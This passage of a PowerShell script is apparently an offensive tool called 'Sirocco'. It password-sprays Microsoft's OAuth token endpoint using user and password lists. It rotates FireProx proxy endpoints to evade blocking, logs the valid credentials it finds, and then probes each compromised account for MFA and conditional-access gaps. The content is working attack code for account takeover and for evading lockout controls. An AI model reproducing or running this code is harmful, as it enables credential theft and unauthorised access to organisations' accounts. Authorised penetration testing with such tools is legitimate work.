    Write-RunLog "Access audit for $Username : $($resList.Count) resources x $($cliList.Count) clients x $($uaList.Count) UAs = $total combos." "Cyan"

    $noMfaResources = New-Object System.Collections.Generic.HashSet[string]
    $noMfaCount = 0
    $done = 0

    foreach ($resName in $resList.Keys) {
        foreach ($cliName in $cliList.Keys) {
            foreach ($uaName in $uaList.Keys) {
                $done++
                Write-Progress -Activity "Access audit: $Username" `
                    -Status ("{0} of {1}  ({2} / {3})" -f $done, $total, $resName, $cliName) `
                    -PercentComplete (($done / $total) * 100)

                $body = @{
                    'resource'    = $resList[$resName]
                    'client_id'   = $cliList[$cliName]
                    'client_info' = '1'
                    'grant_type'  = 'password'
                    'username'    = $Username
                    'password'    = $Password
                    'scope'       = 'openid'
                }
                $headers = @{ 'Accept' = 'application/json'; 'Content-Type' = 'application/x-www-form-urlencoded'; 'User-Agent' = $uaList[$uaName] }

                $ErrorActionPreference = 'SilentlyContinue'
                $resp = $null; $respErr = $null
                $resp = Invoke-WebRequest "$script:CurrentUrl/common/oauth2/token" -Method Post `
                    -Headers $headers -Body $body -ErrorVariable respErr -UseBasicParsing
                $status = if ($resp) { $resp.StatusCode } else { $null }
                $bodyText = if ($resp) { "$($resp.Content)" } else { "$respErr" }

                $v = Get-AuditVerdict -StatusCode $status -Body $bodyText

                if ($v.Forbidden) {
                    # Rotate the FireProx endpoint and retry the same combination.
                    Write-RunLog "Access audit hit FORBIDDEN; rotating FireProx endpoint." "Red"
                    $script:CurrentUrl = New-FireProxUrl
                    $done--   # don't count the blocked attempt
                    continue
                }

                [pscustomobject]@{
                    Timestamp = (Get-Date -Format "yyyy-MM-dd HH:mm:ss")
                    Username  = $Username
                    Password  = $Password
                    Resource  = $resName
                    ClientId  = $cliName
                    UserAgent = $uaName
                    Status    = $v.Status
                    Detail    = $v.Detail
                } | Export-Csv -Path $script:AuditCsv -Append -NoTypeInformation

                if ($v.NoMfa) {
                    $noMfaCount++
                    [void]$noMfaResources.Add($resName)
                    Write-RunLog "  [NO-MFA] $resName | $cliName | $uaName ($($v.Detail))" "Green"
                }

                if ($v.Abort) {
                    Write-RunLog "Access audit aborted for $Username : $($v.Detail)." "Red"
                    Write-Progress -Activity "Access audit: $Username" -Completed
                    return
                }

                if ($AuditDelayMs -gt 0) { Start-Sleep -Milliseconds $AuditDelayMs }
            }
        }
    }

    Write-Progress -Activity "Access audit: $Username" -Completed
    if ($noMfaCount -gt 0) {
        Write-RunLog "Access audit $Username : $noMfaCount single-factor combos across $($noMfaResources.Count) resources -> $($noMfaResources -join ', ')" "Green"
    }
    else {
        Write-RunLog "Access audit $Username : no single-factor combinations found." "Yellow"
    }
}

# ----------------------------------------------------------------------------
# Main
# ----------------------------------------------------------------------------
function Invoke-Sirocco {
    if (-not (Test-Path $UserListPath))     { throw "User list not found: $UserListPath" }
    if (-not (Test-Path $PasswordListPath)) { throw "Password list not found: $PasswordListPath" }

    $script:AllUsers = @(Get-Content $UserListPath     | Where-Object { $_.Trim() -ne "" })
    $passwords       = @(Get-Content $PasswordListPath | Where-Object { $_.Trim() -ne "" })

    if ($script:AllUsers.Count -eq 0) { throw "User list is empty." }
    if ($passwords.Count -eq 0)       { throw "Password list is empty." }

    Write-RunLog "Starting spray: $($script:AllUsers.Count) users x $($passwords.Count) passwords." "Yellow"
    Write-RunLog "Attempt log : $script:CsvLog"
    Write-RunLog "Run log     : $script:RunLog"
    Write-RunLog "Valid creds : $script:ValidLog"

    # Back up the original user list once (refinery rewrites it in place).
    if (-not $NoRefine) {
        $backup = Join-Path $LogDirectory "userlist_backup_$stamp.txt"
        Copy-Item -Path $UserListPath -Destination $backup -Force
        Write-RunLog "User refinery ENABLED. Original list backed up to: $backup" "Magenta"
        Write-RunLog "Removed users will be logged to: $script:RemovedLog" "Magenta"
    }
    else {
        Write-RunLog "User refinery DISABLED (-NoRefine)." "DarkGray"
    }

    # Load MFASweep's auth functions if a path was supplied.
    $script:MfaEnabled = $false
    if ($MFASweepPath) {
        if (-not (Test-Path $MFASweepPath)) { throw "MFASweep script not found: $MFASweepPath" }
        . $MFASweepPath
        if (-not (Get-Command Invoke-GraphAPIAuth -ErrorAction SilentlyContinue)) {
            throw "Dot-sourcing '$MFASweepPath' did not define the expected MFASweep functions."
        }
        $script:MfaEnabled = $true
        Write-RunLog "MFA sweep ENABLED. Per-service results -> $script:MfaCsv (raw output -> $script:MfaRawLog)." "Cyan"
        if ($IncludeADFS) { Write-RunLog "MFA sweep will include the on-prem ADFS check." "Cyan" }
    }
    else {
        Write-RunLog "MFA sweep DISABLED (supply -MFASweepPath to enable)." "DarkGray"
    }

    # Access / conditional-access gap audit (FindMeAccess-style).
    if ($AccessAudit) {
        if ($AuditConfig -and ($AuditResource -or $AuditClient -or $AuditUserAgent -or $AuditAllUserAgents)) {
            throw "Cannot combine -AuditConfig with -AuditResource/-AuditClient/-AuditUserAgent/-AuditAllUserAgents."
        }
        Write-RunLog "Access audit ENABLED. Per-combination results -> $script:AuditCsv." "Cyan"
    }
    else {
        Write-RunLog "Access audit DISABLED (supply -AccessAudit to enable)." "DarkGray"
    }

    # Establish the starting endpoint.
    if ($Url) {
        $script:CurrentUrl = $Url.TrimEnd('/')
        Write-RunLog "Using supplied FireProx URL: $script:CurrentUrl" "Cyan"
    }
    else {
        $script:CurrentUrl = New-FireProxUrl
    }

    foreach ($password in $passwords) {
        # Only target users still believed to exist (refinery skips pruned ones).
        $targets = @($script:AllUsers | Where-Object { -not $script:InvalidUsers.Contains($_) })
        Write-RunLog "Spraying password: $password  ($($targets.Count) live users)" "Yellow"

        $rotations = 0
        $i = 0

        while ($i -lt $targets.Count) {
            $user = $targets[$i]
            # Single in-place progress bar instead of a new console line per user.
            Write-Progress -Activity "Spraying password '$password'" `
                -Status ("{0} of {1} users  (last: {2})" -f ($i + 1), $targets.Count, $user) `
                -PercentComplete ((($i + 1) / $targets.Count) * 100)

            $r = Invoke-SprayRequest -Endpoint $script:CurrentUrl -Username $user -Password $password

            if ($r.Forbidden) {
                $rotations++
                Write-RunLog "FORBIDDEN at user '$user' on $script:CurrentUrl. Rotating (rotation $rotations/$MaxRotations) and resuming from this user." "Red"
                Write-Attempt -Username $user -Password $password -Result "FORBIDDEN-ROTATE" -Detail "Rotation $rotations" -Endpoint $script:CurrentUrl

                if ($rotations -gt $MaxRotations) {
                    throw "Exceeded MaxRotations ($MaxRotations) for password '$password'. Aborting to avoid creating endless endpoints."
                }
                $script:CurrentUrl = New-FireProxUrl
                continue   # retry the SAME user -> resume, don't advance
            }

            Write-Attempt -Username $user -Password $password -Result $r.Result -Detail $r.Detail -Endpoint $script:CurrentUrl

            if ($r.Success) {
                $msg = "[SUCCESS] $user : $password"
                if ($r.Detail) { $msg += " ($($r.Detail))" }
                Write-RunLog $msg "Green"
                Add-Content -Path $script:ValidLog -Value ("{0}  {1} : {2}  [{3}] {4}" -f (Get-Date -Format "yyyy-MM-dd HH:mm:ss"), $user, $password, $r.Result, $r.Detail)

                # Run the MFA sweep against the freshly-confirmed credential.
                if ($script:MfaEnabled) {
                    Invoke-SiroccoMfaSweep -Username $user -Password $password
                }

                # Run the MFA/conditional-access gap audit (FindMeAccess-style).
                if ($AccessAudit) {
                    Invoke-SiroccoAccessAudit -Username $user -Password $password
                }
            }
            elseif ($r.UserAbsent) {
                Remove-User -Username $user -Reason $r.Result
            }

            $i++
        }

        Write-Progress -Activity "Spraying password '$password'" -Completed

        # Persist the refined list after each password round.
        Save-RefinedUserList

        Write-RunLog "Finished password '$password'. Pruned so far: $($script:InvalidUsers.Count)." "Yellow"
        if ($password -ne $passwords[-1]) {
            Write-RunLog "Sleeping for $SleepSeconds seconds." "Yellow"
            Start-Sleep -Seconds $SleepSeconds
        }
    }

    Save-RefinedUserList
    Write-RunLog "Spray complete. $($script:InvalidUsers.Count) non-existent users pruned from $UserListPath." "Green"
    Write-RunLog "Endpoints created are listed in: $script:Endpoints" "Green"
    Write-RunLog "Tip: delete endpoints with: $Launcher python3 `"$FireProxPath`" --access_key ... --secret_access_key ... --region $Region --command delete --api_id <id>" "DarkGray"
}

Invoke-Sirocco
